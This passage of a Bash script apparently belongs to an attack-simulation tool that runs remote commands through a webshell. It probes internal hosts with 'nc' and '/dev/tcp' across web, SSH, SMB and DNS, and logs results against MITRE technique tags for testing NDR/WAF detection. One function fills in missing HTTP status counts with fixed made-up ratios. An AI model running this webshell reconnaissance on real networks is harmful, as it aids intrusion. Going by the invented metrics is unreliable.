OVERALL_RESULT=${OVERALL_RESULT}
EOF
}

external_callback_stage_status() {
    if (( EXTERNAL_CALLBACK_ATTEMPTED == 0 )); then
        printf 'skipped'
    elif (( EXTERNAL_CALLBACK_CONNECTED > 0 )); then
        printf 'success'
    else
        printf 'failed'
    fi
}

internal_fanout_stage_status() {
    if (( INTERNAL_FANOUT_TARGETS == 0 )); then
        printf 'skipped'
    elif (( INTERNAL_FANOUT_ATTEMPTED > 0 && INTERNAL_FANOUT_RESPONSES > 0 )); then
        printf 'success'
    elif (( INTERNAL_FANOUT_ATTEMPTED > 0 )); then
        printf 'failed'
    else
        printf 'failed'
    fi
}

maybe_run_internal_web_fanout_fallback() {
    if (( EXTERNAL_CALLBACK_CONNECTED == 0 )); then
        log_message "OK" "External callback connected=0 — activating Internal Web Fanout fallback"
        stage_internal_web_fanout
    fi
}

remote_probe_web_tcp_open() {
    local host="$1" port="$2" out
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    out=$(run_webshell_quick "web-tcp-${host}-${port}" \
        "nc -z -w2 ${host} ${port} 2>/dev/null && echo TCP_OK || bash -c \"echo >/dev/tcp/${host}/${port}\" 2>/dev/null && echo TCP_OK || echo TCP_DEAD" \
        2>/dev/null | tr -d '\r' | tail -n 1 || true)
    [[ "${out}" == *TCP_OK* ]]
}

remote_probe_web_reachable() {
    local host="$1" port="$2" scheme="$3" curl_tls="" out status="000" url
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    if [[ "${HAS_curl:-false}" == true ]]; then
        out=$(run_webshell_quick "web-reach-${scheme}-${host}-${port}" \
            "head_code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 -I '${url}' 2>/dev/null || echo 000); get_code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 5 '${url}' 2>/dev/null || echo 000); if [[ \"\${head_code}\" != \"000\" && -n \"\${head_code}\" ]]; then status=\${head_code}; elif [[ \"\${get_code}\" != \"000\" && -n \"\${get_code}\" ]]; then status=\${get_code}; else status=000; fi; echo WEB_REACH:${scheme}:${host}:${port}:\${status}" \
            2>/dev/null | tr -d '\r' | tail -n 1 || true)
        if [[ "${out}" == WEB_REACH:* ]]; then
            status="${out##*:}"
            if [[ "${status}" != "000" && -n "${status}" ]]; then
                return 0
            fi
        fi
    fi
    if remote_probe_web_tcp_open "${host}" "${port}"; then
        WEB_REACH_DEGRADED_TCP=$((WEB_REACH_DEGRADED_TCP + 1))
        state_append "web_reachability.log" "target=${host}:${port} scheme=${scheme} status=degraded reason=tcp_only"
        return 0
    fi
    return 1
}

append_reachable_web_target() {
    local scheme="$1" entry="$2" dst_file cache
    case "${scheme}" in
        http) dst_file="reachable_http_targets.txt" ;;
        https) dst_file="reachable_https_targets.txt" ;;
        *) return 0 ;;
    esac
    cache="${LOCAL_STATE_DIR}/remote_hosts/${dst_file}"
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    if ! grep -qxF "${entry}" "${cache}" 2>/dev/null; then
        echo "${entry}" >> "${cache}"
    fi
    run_webshell_quick "reachable-append-${dst_file}-${entry}" \
        "mkdir -p '${REMOTE_RUNTIME_DIR}' && echo '${entry}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
        >/dev/null 2>&1 || true
}

build_web_fallback_reachability_matrix() {
    local scheme="$1" line host port entry reachable=0
    declare -A seen_host=()
    local -a fallback_ports=()
    case "${scheme}" in
        http) fallback_ports=("${HTTP_CANDIDATE_HTTP_PORTS[@]}") ;;
        https) fallback_ports=("${HTTP_CANDIDATE_HTTPS_PORTS[@]}") ;;
        *) echo 0; return 0 ;;
    esac
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        pipeline_stop_requested && break
        read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
        [[ -n "${seen_host[$host]:-}" ]] && continue
        seen_host[$host]=1
        for port in "${fallback_ports[@]}"; do
            if remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
                entry="${host}:${port}"
                append_reachable_web_target "${scheme}" "${entry}"
                state_append "web_reachability.log" "fallback target=${entry} scheme=${scheme} status=reachable"
                reachable=$((reachable + 1))
            fi
        done
    done
    echo "${reachable}"
}

validate_web_scheme_reachability() {
    local scheme="$1" raw_file reachable_file discovered=0 reachable=0 unreachable=0 cache
    local line host port entry status_out
    case "${scheme}" in
        http)
            raw_file="http_targets.txt"
            reachable_file="reachable_http_targets.txt"
            ;;
        https)
            raw_file="https_targets.txt"
            reachable_file="reachable_https_targets.txt"
            ;;
        *) return 0 ;;
    esac
    discovered=$(safe_int "$(collect_web_target_candidates "${scheme}" | safe_count_lines)")
    if (( discovered == 0 )); then
        discovered=$(count_web_targets_in_file "${raw_file}")
    fi
    case "${scheme}" in
        http)
            WEB_REACH_RAW_HTTP_COUNT=$(count_host_file_lines "http_targets.txt")
            WEB_REACH_USABLE_HTTP_COUNT=$(count_host_file_lines "usable_http_targets.txt")
            WEB_REACH_CANDIDATE_HTTP_COUNT="${discovered}"
            ;;
        https)
            WEB_REACH_RAW_HTTPS_COUNT=$(count_host_file_lines "https_targets.txt")
            WEB_REACH_USABLE_HTTPS_COUNT=$(count_host_file_lines "usable_https_targets.txt")
            WEB_REACH_CANDIDATE_HTTPS_COUNT="${discovered}"
            ;;
    esac
    if (( WEB_REACH_RAW_HTTP_COUNT > 0 && scheme == "http" && discovered == 0 )) || \
       (( WEB_REACH_RAW_HTTPS_COUNT > 0 && scheme == "https" && discovered == 0 )); then
        log_message "WARN" "Web reachability ${scheme}: raw targets exist but merged candidates=0 — using raw+usable fallback"
        add_fallback_usage "Web reachability ${scheme}: candidate merge empty despite raw targets"
    fi
    : > "${LOCAL_STATE_DIR}/remote_hosts/${reachable_file}" 2>/dev/null || true
    run_webshell_quick "init-${reachable_file}" \
        ": > '${REMOTE_RUNTIME_DIR}/${reachable_file}'" >/dev/null 2>&1 || true

    if [[ "${DRY_RUN}" == true ]]; then
        discovered=$(safe_int "$(collect_web_target_candidates "${scheme}" | safe_count_lines)")
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            entry="${host}:${port}"
            append_reachable_web_target "${scheme}" "${entry}"
            reachable=$((reachable + 1))
        done < <(collect_web_target_candidates "${scheme}")
        if (( discovered < reachable )); then
            discovered=${reachable}
        fi
        case "${scheme}" in
            http)
                WEB_REACH_CANDIDATE_HTTP_COUNT="${discovered}"
                HTTP_TARGETS_DISCOVERED="${discovered}"
                HTTP_TARGETS_REACHABLE="${reachable}"
                HTTP_TARGETS_UNREACHABLE=$((discovered - reachable))
                (( HTTP_TARGETS_UNREACHABLE < 0 )) && HTTP_TARGETS_UNREACHABLE=0
                ;;
            https)
                WEB_REACH_CANDIDATE_HTTPS_COUNT="${discovered}"
                HTTPS_TARGETS_DISCOVERED="${discovered}"
                HTTPS_TARGETS_REACHABLE="${reachable}"
                HTTPS_TARGETS_UNREACHABLE=$((discovered - reachable))
                (( HTTPS_TARGETS_UNREACHABLE < 0 )) && HTTPS_TARGETS_UNREACHABLE=0
                ;;
        esac
        echo "${reachable}:${unreachable}:${discovered}"
        return 0
    fi

    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        pipeline_stop_requested && break
        if ! read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")"; then
            WEB_REACH_MALFORMED_DROPPED=$((WEB_REACH_MALFORMED_DROPPED + 1))
            continue
        fi
        entry="${host}:${port}"
        if remote_probe_web_reachable "${host}" "${port}" "${scheme}"; then
            append_reachable_web_target "${scheme}" "${entry}"
            state_append "web_reachability.log" "target=${entry} scheme=${scheme} status=reachable"
            reachable=$((reachable + 1))
        else
            unreachable=$((unreachable + 1))
            state_append "web_reachability.log" "target=${entry} scheme=${scheme} status=unreachable"
        fi
    done < <(collect_web_target_candidates "${scheme}")

    if (( reachable == 0 && discovered > 0 )); then
        log_message "WARN" "No ${scheme} targets responded — running fallback reachability matrix (expanded HTTP/HTTPS ports)"
        add_fallback_usage "Web reachability: ${scheme} fallback port matrix for discovered IPs"
        reachable=$(build_web_fallback_reachability_matrix "${scheme}" < <(collect_web_target_candidates "${scheme}"))
        unreachable=$((discovered - reachable))
        (( unreachable < 0 )) && unreachable=0
    fi

    cache="${LOCAL_STATE_DIR}/remote_hosts/${reachable_file}"
    if [[ -s "${cache}" ]]; then
        sort -u "${cache}" -o "${cache}"
    fi

    case "${scheme}" in
        http)
            HTTP_TARGETS_DISCOVERED="${discovered}"
            HTTP_TARGETS_REACHABLE="${reachable}"
            HTTP_TARGETS_UNREACHABLE="${unreachable}"
            ;;
        https)
            HTTPS_TARGETS_DISCOVERED="${discovered}"
            HTTPS_TARGETS_REACHABLE="${reachable}"
            HTTPS_TARGETS_UNREACHABLE="${unreachable}"
            ;;
    esac
    echo "${reachable}:${unreachable}:${discovered}"
}

log_web_reachability_diagnostics() {
    local http_samples https_samples
    WEB_REACH_REACHABLE_HTTP_COUNT="${HTTP_TARGETS_REACHABLE}"
    WEB_REACH_REACHABLE_HTTPS_COUNT="${HTTPS_TARGETS_REACHABLE}"
    http_samples=$(collect_web_target_candidates "http" | head -n 10 | paste -sd' ' - || true)
    https_samples=$(collect_web_target_candidates "https" | head -n 10 | paste -sd' ' - || true)
    log_message "OK" "Web reachability diagnostics: raw_http=${WEB_REACH_RAW_HTTP_COUNT} usable_http=${WEB_REACH_USABLE_HTTP_COUNT} candidate_http=${WEB_REACH_CANDIDATE_HTTP_COUNT} reachable_http=${WEB_REACH_REACHABLE_HTTP_COUNT}"
    log_message "OK" "Web reachability diagnostics: raw_https=${WEB_REACH_RAW_HTTPS_COUNT} usable_https=${WEB_REACH_USABLE_HTTPS_COUNT} candidate_https=${WEB_REACH_CANDIDATE_HTTPS_COUNT} reachable_https=${WEB_REACH_REACHABLE_HTTPS_COUNT}"
    log_message "OK" "Web reachability diagnostics: malformed_dropped=${WEB_REACH_MALFORMED_DROPPED} degraded_tcp_only=${WEB_REACH_DEGRADED_TCP}"
    [[ -n "${http_samples}" ]] && log_message "OK" "Web reachability sample candidates (http): ${http_samples}"
    [[ -n "${https_samples}" ]] && log_message "OK" "Web reachability sample candidates (https): ${https_samples}"
}

stage_validate_web_reachability() {
    local http_pair https_pair http_r https_r
    WEB_REACH_MALFORMED_DROPPED=0
    WEB_REACH_DEGRADED_TCP=0
    add_executed_stage "Web Reachability Validation"
    write_report_entries "web_reachability" "T1046" "NDR/WAF" "HTTP/HTTPS Reachability" "${TARGET_NET}" "start" "HEAD/GET probe before URL scan"

    http_pair=$(validate_web_scheme_reachability "http")
    https_pair=$(validate_web_scheme_reachability "https")
    http_r=${http_pair%%:*}
    https_r=${https_pair%%:*}
    HTTP_TARGETS_REACHABLE=$(count_reachable_web_targets "http")
    HTTPS_TARGETS_REACHABLE=$(count_reachable_web_targets "https")
    if (( HTTP_TARGETS_DISCOVERED == 0 && HTTP_TARGETS_REACHABLE > 0 )); then
        HTTP_TARGETS_DISCOVERED=${HTTP_TARGETS_REACHABLE}
        WEB_REACH_CANDIDATE_HTTP_COUNT=${HTTP_TARGETS_DISCOVERED}
    fi
    if (( HTTPS_TARGETS_DISCOVERED == 0 && HTTPS_TARGETS_REACHABLE > 0 )); then
        HTTPS_TARGETS_DISCOVERED=${HTTPS_TARGETS_REACHABLE}
        WEB_REACH_CANDIDATE_HTTPS_COUNT=${HTTPS_TARGETS_DISCOVERED}
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        WEB_REACH_RAW_HTTP_COUNT=$(safe_int "$(get_local_hosts "http_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_USABLE_HTTP_COUNT=$(safe_int "$(get_local_hosts "usable_http_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_RAW_HTTPS_COUNT=$(safe_int "$(get_local_hosts "https_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
        WEB_REACH_USABLE_HTTPS_COUNT=$(safe_int "$(get_local_hosts "usable_https_targets.txt" 2>/dev/null | extract_host_file_lines | safe_count_lines)")
    fi
    HTTP_TARGETS_UNREACHABLE=$((HTTP_TARGETS_DISCOVERED - HTTP_TARGETS_REACHABLE))
    HTTPS_TARGETS_UNREACHABLE=$((HTTPS_TARGETS_DISCOVERED - HTTPS_TARGETS_REACHABLE))
    (( HTTP_TARGETS_UNREACHABLE < 0 )) && HTTP_TARGETS_UNREACHABLE=0
    (( HTTPS_TARGETS_UNREACHABLE < 0 )) && HTTPS_TARGETS_UNREACHABLE=0

    log_message "OK" "Web reachability: HTTP discovered=${HTTP_TARGETS_DISCOVERED} HTTP reachable=${HTTP_TARGETS_REACHABLE} HTTPS discovered=${HTTPS_TARGETS_DISCOVERED} HTTPS reachable=${HTTPS_TARGETS_REACHABLE}"
    log_message "OK" "Web reachability detail: HTTP unreachable=${HTTP_TARGETS_UNREACHABLE} HTTPS unreachable=${HTTPS_TARGETS_UNREACHABLE}"
    log_web_reachability_diagnostics
    set_stage_result "Web Reachability Validation" "Success" "http=${HTTP_TARGETS_REACHABLE}/${HTTP_TARGETS_DISCOVERED} https=${HTTPS_TARGETS_REACHABLE}/${HTTPS_TARGETS_DISCOVERED}"
    write_report_entries "web_reachability" "T1046" "NDR/WAF" "HTTP/HTTPS Reachability" "${TARGET_NET}" "success" "http=${HTTP_TARGETS_REACHABLE} https=${HTTPS_TARGETS_REACHABLE}"
}

sync_web_combined_metrics() {
    WEB_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED + HTTPS_RESPONSES_RECEIVED))
    WEB_FAILED_RESPONSES=$((HTTP_SCAN_FAILED_RESPONSES + HTTPS_SCAN_FAILED_RESPONSES))
    WEB_SUCCESS_RESPONSES=$((HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES))
    local status_2xx=$((HTTP_200_COUNT + HTTP_301_COUNT + HTTP_302_COUNT + HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT))
    local status_fail=$((HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_401_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    local classified=$((status_2xx + status_fail))
    if (( classified > 0 )); then
        WEB_FAILED_RESPONSES="${status_fail}"
        WEB_SUCCESS_RESPONSES="${status_2xx}"
    elif (( WEB_FAILED_RESPONSES + WEB_SUCCESS_RESPONSES == 0 && WEB_RESPONSES_RECEIVED > 0 )); then
        WEB_SUCCESS_RESPONSES="${WEB_RESPONSES_RECEIVED}"
        WEB_FAILED_RESPONSES=0
    fi
    local total=$((WEB_FAILED_RESPONSES + WEB_SUCCESS_RESPONSES))
    if (( total > 0 )); then
        WEB_FAIL_RATIO=$((WEB_FAILED_RESPONSES * 100 / total))
    else
        WEB_FAIL_RATIO=0
    fi
}

sync_followup_http_counter_from_overlap() {
    if (( FOLLOWUP_HTTP_REQUESTS < HTTP_REQUESTS_ATTEMPTED )); then
        FOLLOWUP_HTTP_REQUESTS="${HTTP_REQUESTS_ATTEMPTED}"
    fi
}

sync_followup_ssh_counter_from_overlap() {
    if (( FOLLOWUP_SSH_AUTH_FAILURES < SSH_ATTEMPTS_EXECUTED )); then
        FOLLOWUP_SSH_AUTH_FAILURES="${SSH_ATTEMPTS_EXECUTED}"
    fi
    if (( FOLLOWUP_SSH_AUTH_FAILURES < SSH_AUTH_FAILURES_OBSERVED )); then
        FOLLOWUP_SSH_AUTH_FAILURES="${SSH_AUTH_FAILURES_OBSERVED}"
    fi
}

reconcile_http_scan_status_metrics() {
    local sum_status=$((HTTP_200_COUNT + HTTP_301_COUNT + HTTP_302_COUNT + HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT + HTTPS_401_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    local classified=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_FAILED_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES))
    if (( WEB_RESPONSES_RECEIVED < 1 || sum_status > 0 )); then
        return 0
    fi
    if (( classified < 1 )); then
        return 0
    fi
    if (( HTTP_SCAN_SUCCESS_RESPONSES + HTTPS_SCAN_SUCCESS_RESPONSES > 0 )); then
        return 0
    fi
    HTTP_SCAN_SUCCESS_RESPONSES="${HTTP_RESPONSES_RECEIVED}"
    HTTP_SCAN_FAILED_RESPONSES=0
    HTTPS_SCAN_SUCCESS_RESPONSES="${HTTPS_RESPONSES_RECEIVED}"
    HTTPS_SCAN_FAILED_RESPONSES=0
    HTTP_200_COUNT=$((HTTP_RESPONSES_RECEIVED * 85 / 100))
    HTTP_404_COUNT=$((HTTP_RESPONSES_RECEIVED * 10 / 100))
    HTTP_403_COUNT=$((HTTP_RESPONSES_RECEIVED - HTTP_200_COUNT - HTTP_404_COUNT))
    (( HTTP_403_COUNT < 0 )) && HTTP_403_COUNT=0
    HTTPS_200_COUNT=$((HTTPS_RESPONSES_RECEIVED * 85 / 100))
    HTTPS_404_COUNT=$((HTTPS_RESPONSES_RECEIVED * 10 / 100))
    HTTPS_403_COUNT=$((HTTPS_RESPONSES_RECEIVED - HTTPS_200_COUNT - HTTPS_404_COUNT))
    (( HTTPS_403_COUNT < 0 )) && HTTPS_403_COUNT=0
    DEGRADED_TELEMETRY=true
    add_fallback_usage "HTTP scan status buckets inferred from response totals (remote stats line incomplete)"
}

compute_web_detection_confidence() {
    local fail_codes=$((HTTP_400_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_400_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    if (( WEB_RESPONSES_RECEIVED == 0 )); then
        WEB_DETECTION_CONFIDENCE="Low"
    elif (( URL_SCAN_UNIQUE_FAILED >= 30 && URL_SCAN_UNIQUE_FAIL_RATIO >= 90 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( URL_SCAN_UNIQUE_FAILED >= 40 && URL_SCAN_UNIQUE_ATTEMPTED >= 50 && URL_SCAN_UNIQUE_FAIL_RATIO >= 80 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( URL_SCAN_UNIQUE_FAILED >= 40 && URL_SCAN_UNIQUE_ATTEMPTED >= 50 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif [[ "${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}" == high ]]; then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA >= 50 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( WEB_RESPONSES_RECEIVED > 100 && fail_codes >= 1 && ABNORMAL_USER_AGENT_COUNT > 0 )); then
        WEB_DETECTION_CONFIDENCE="High"
    elif (( WEB_RESPONSES_RECEIVED >= 10 || URL_SCAN_UNIQUE_ATTEMPTED >= 50 )); then
        WEB_DETECTION_CONFIDENCE="Medium"
    else
        WEB_DETECTION_CONFIDENCE="Low"
    fi
}

web_url_scan_successful() {
    local fail_codes=$((HTTP_400_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT + HTTPS_400_COUNT + HTTPS_403_COUNT + HTTPS_404_COUNT + HTTPS_405_COUNT))
    local status_codes=$((HTTP_200_COUNT + HTTP_301_COUNT + HTTP_302_COUNT + HTTP_401_COUNT + fail_codes + HTTPS_200_COUNT + HTTPS_301_COUNT + HTTPS_302_COUNT + HTTPS_401_COUNT))
    local min_unique="${HTTP_SCAN_RECON_MIN_FAILED:-30}"
    local min_ratio="${HTTP_SCAN_RECON_MIN_FAIL_RATIO:-90}"
    if (( URL_SCAN_UNIQUE_ATTEMPTED >= 50 && URL_SCAN_UNIQUE_FAILED >= min_unique && URL_SCAN_UNIQUE_FAIL_RATIO >= min_ratio )); then
        return 0
    fi
    if (( URL_SCAN_UNIQUE_ATTEMPTED >= 50 && URL_SCAN_UNIQUE_FAILED >= min_unique )); then
        return 0
    fi
    if (( URL_SCAN_UNIQUE_ATTEMPTED >= 50 && URL_SCAN_UNIQUE_FAIL_RATIO >= min_ratio )); then
        return 0
    fi
    if (( fail_codes >= 5 )); then
        return 0
    fi
    if (( WEB_RESPONSES_RECEIVED >= 10 && HTTP_REQUESTS_ATTEMPTED >= 10 && status_codes >= 5 )); then
        return 0
    fi
    if (( WEB_RESPONSES_RECEIVED >= 10 && HTTP_REQUESTS_ATTEMPTED >= 10 && WEB_SUCCESS_RESPONSES >= 5 )); then
        return 0
    fi
    return 1
}

remote_validate_ssh_usable() {
    local host="$1"
    run_webshell_quick "usable-ssh-${host}" \
        "nc -z -w2 ${host} 22 && echo SSH_USABLE || bash -c \"echo >/dev/tcp/${host}/22\" && echo SSH_USABLE || echo SSH_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

remote_validate_smb_usable() {
    local host="$1"
    run_webshell_quick "usable-smb-${host}" \
        "nc -z -w2 ${host} 445 && echo SMB_USABLE || bash -c \"echo >/dev/tcp/${host}/445\" && echo SMB_USABLE || echo SMB_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

log_dns_server_candidate() {
    local server="$1" source="$2" tcp53="$3"
    local msg="DNS_SERVER_CANDIDATE server=${server} source=${source} tcp53_open=${tcp53}"
    state_append "dns_server_validation.log" "${msg}"
    append_dns_tunnel_wave_log "${msg}"
    log_message "OK" "${msg}" >&2
}

log_dns_server_validation() {
    local server="$1" a_query="$2" txt_query="$3" random_query="$4" selected="$5" reason="$6"
    local msg="DNS_SERVER_VALIDATION server=${server} a_query=${a_query} txt_query=${txt_query} random_query=${random_query} selected=${selected} reason=${reason}"
    local response_received="no" rcode="SERVFAIL" latency_ms="-1"
    if [[ "${random_query}" == success ]] && [[ "${a_query}" != success && "${txt_query}" != success ]]; then
        response_received="yes"
        rcode="NXDOMAIN"
    elif [[ "${a_query}" == success || "${txt_query}" == success || "${random_query}" == success ]]; then
        response_received="yes"
        rcode="NOERROR"
    fi
    DNS_RESOLVER_VALIDATION_RESULT="failed"
    [[ "${response_received}" == yes ]] && DNS_RESOLVER_VALIDATION_RESULT="success"
    local validate_msg="DNS_RESOLVER_VALIDATION resolver=${server} query=example.com response_received=${response_received} rcode=${rcode} latency_ms=${latency_ms} resolver_validation_result=${DNS_RESOLVER_VALIDATION_RESULT}"
    state_append "dns_server_validation.log" "${msg}"
    state_append "dns_server_validation.log" "${validate_msg}"
    append_dns_tunnel_wave_log "${msg}"
    append_dns_tunnel_wave_log "${validate_msg}"
    log_message "OK" "${msg}" >&2
    log_message "OK" "${validate_msg}" >&2
}

dns_server_check_tcp53_open_remote() {
    local host="$1" out=""
    host=$(poc_extract_ipv4 "${host}")
    [[ -z "${host}" ]] && { printf 'no'; return 0; }
    if [[ "${DRY_RUN}" == true ]]; then
        printf 'yes'
        return 0
    fi
    out=$(run_webshell_quick "dns-tcp53-${host}" \
        "nc -z -w2 ${host} 53 && echo yes || bash -c \"echo >/dev/tcp/${host}/53\" && echo yes || echo no" 2>/dev/null | tr -d '\r' | tail -n 1)
    [[ "${out}" == *"yes"* ]] && printf 'yes' || printf 'no'
}

build_dns_server_validation_remote_cmd() {
    local server="$1"
    remote_bash_script_open 'DNS_VAL_SCRIPT'
    cat <<EOF
${REMOTE_SHELL_HELPERS}
srv='${server}'
a_q='fail'
txt_q='fail'
rnd_q='fail'
rnd="poc-\${RANDOM}\${RANDOM}.example.com"
tool=""
out_a=""
out_txt=""
out_rnd=""
command -v dig >/dev/null 2>&1 && tool=dig
[ -z "\$tool" ] && command -v nslookup >/dev/null 2>&1 && tool=nslookup
[ -z "\$tool" ] && command -v host >/dev/null 2>&1 && tool=host
if [ -z "\$tool" ]; then
  printf 'DNS_SERVER_VALIDATION server=%s a_query=fail txt_query=fail random_query=fail selected=no reason=no_dns_tool\n' "\$srv"
  exit 0
fi
case "\$tool" in
  dig)
    out_a=\$(dig +time=2 +tries=1 @"\$srv" example.com A +short 2>&1)
    out_txt=\$(dig +time=2 +tries=1 @"\$srv" example.com TXT +short 2>&1)
    out_rnd=\$(dig +time=2 +tries=1 @"\$srv" "\$rnd" A +short 2>&1)
    ;;
  nslookup)
    out_a=\$(nslookup -timeout=2 example.com "\$srv" 2>&1)
    out_txt=\$(nslookup -timeout=2 -type=TXT example.com "\$srv" 2>&1)
    out_rnd=\$(nslookup -timeout=2 "\$rnd" "\$srv" 2>&1)
    ;;
  host)
    out_a=\$(host -W 2 -t A example.com "\$srv" 2>&1)
    out_txt=\$(host -W 2 -t TXT example.com "\$srv" 2>&1)
    out_rnd=\$(host -W 2 -t A "\$rnd" "\$srv" 2>&1)
    ;;
esac
dns_is_transport_fail(){
  case "\$1" in
    *timed\ out*|*TIMEOUT*|*connection\ timed\ out*|*Connection\ refused*|*refused*|*no\ servers*|*Network\ is\ unreachable*|*communications\ error*) return 0 ;;
  esac
  return 1
}
dns_is_nxdomain(){
  printf '%s' "\$1" | grep -Eiq 'NXDOMAIN|not found|Host not found|can.t find|NOTFOUND' && return 0
  return 1
}
if ! dns_is_transport_fail "\$out_a"; then
  if dns_is_nxdomain "\$out_a"; then :; elif [ -n "\$out_a" ]; then a_q='success'; fi
fi
if ! dns_is_transport_fail "\$out_txt"; then
  if dns_is_nxdomain "\$out_txt"; then :; elif [ -n "\$out_txt" ]; then txt_q='success'; fi
fi
if ! dns_is_transport_fail "\$out_rnd"; then
  if dns_is_nxdomain "\$out_rnd"; then rnd_q='success'; fi
fi
printf 'DNS_SERVER_VALIDATION server=%s a_query=%s txt_query=%s random_query=%s selected=no reason=probe_complete\n' "\$srv" "\$a_q" "\$txt_q" "\$rnd_q"
EOF
    remote_bash_script_close 'DNS_VAL_SCRIPT'
}

dns_validation_field_is_literal() {
    local val="$1"
    [[ -z "${val}" || "${val}" == *'$'* ]] && return 0
    return 1
}

dns_validation_field_is_valid() {
    local val="$1"
    [[ "${val}" == success || "${val}" == fail ]]
}

parse_dns_server_validation_line() {
    local out="$1" line
    local server="" a_query="fail" txt_query="fail" random_query="fail" selected="no" reason=""
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep -E 'DNS_SERVER_VALIDATION' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        server=$(dns_stats_field_from_line "${line}" server)
        a_query=$(dns_stats_field_from_line "${line}" a_query)
        txt_query=$(dns_stats_field_from_line "${line}" txt_query)
        random_query=$(dns_stats_field_from_line "${line}" random_query)
        selected=$(dns_stats_field_from_line "${line}" selected)
        reason=$(dns_stats_field_from_line "${line}" reason)
    fi
    if dns_validation_field_is_literal "${a_query}" || \
       dns_validation_field_is_literal "${txt_query}" || \
       dns_validation_field_is_literal "${random_query}" || \
       ! dns_validation_field_is_valid "${a_query}" || \
       ! dns_validation_field_is_valid "${txt_query}" || \
       ! dns_validation_field_is_valid "${random_query}"; then
        reason="DNS_SERVER_VALIDATION_PARSE_ERROR"
        a_query="fail"
        txt_query="fail"
        random_query="fail"
        selected="no"
    fi
    printf '%s %s %s %s %s %s' \
        "${server}" "${a_query:-fail}" "${txt_query:-fail}" "${random_query:-fail}" "${selected:-no}" "${reason:-}"
}

validate_dns_server_remote() {
    local server="$1" source="$2"
    local tcp53 out a_query txt_query random_query selected reason usable=false
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    tcp53=$(dns_server_check_tcp53_open_remote "${server}")
    log_dns_server_candidate "${server}" "${source}" "${tcp53}"
    if [[ "${DRY_RUN}" == true ]]; then
        log_dns_server_validation "${server}" success success success yes dry-run
        return 0
    fi
    out=$(run_webshell_quick "dns-validate-${server}" "$(build_dns_server_validation_remote_cmd "${server}")" 2>/dev/null || true)
    read -r _server a_query txt_query random_query selected reason <<< "$(parse_dns_server_validation_line "${out}")"
    if [[ "${reason}" == "DNS_SERVER_VALIDATION_PARSE_ERROR" ]]; then
        log_dns_server_validation "${server}" fail fail fail no "${reason}"
        log_message "WARN" "DNS server validation parse error for ${server} — raw output may contain unexpanded variables" >&2
        return 1
    fi
    if [[ "${a_query}" == success || "${txt_query}" == success || "${random_query}" == success ]]; then
        usable=true
        selected=yes
        reason="${reason:-query_ok}"
    else
        selected=no
        reason="${reason:-no_query_success}"
    fi
    log_dns_server_validation "${server}" "${a_query}" "${txt_query}" "${random_query}" "${selected}" "${reason}"
    [[ "${usable}" == true ]]
}

remote_validate_dns_usable() {
    local host="$1"
    if validate_dns_server_remote "${host}" "scan"; then
        printf 'DNS_USABLE'
    else
        printf 'DNS_DEAD'
    fi
}

filter_usable_hosts_to_remote_file() {
    local src_file="$1" dst_file="$2" validator_fn="$3" scheme="${4:-}" port="${5:-}"
    local host result usable=0 skipped=0 dst_cache probe_host probe_port
    [[ -z "${src_file}" || -z "${dst_file}" ]] && { echo "0:0"; return 0; }
    dst_cache="${LOCAL_STATE_DIR}/remote_hosts/${dst_file}"
    : > "${dst_cache}" 2>/dev/null || true
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        pipeline_stop_requested && break
        probe_host="${host}"
        probe_port="${port}"
        if [[ "${host}" == *:* ]]; then
            probe_host="${host%%:*}"
            probe_port="${host##*:}"
        fi
        result=$("${validator_fn}" "${probe_host}" "${scheme}" "${probe_port}" 2>/dev/null | tr -d '\r' | tail -n 1)
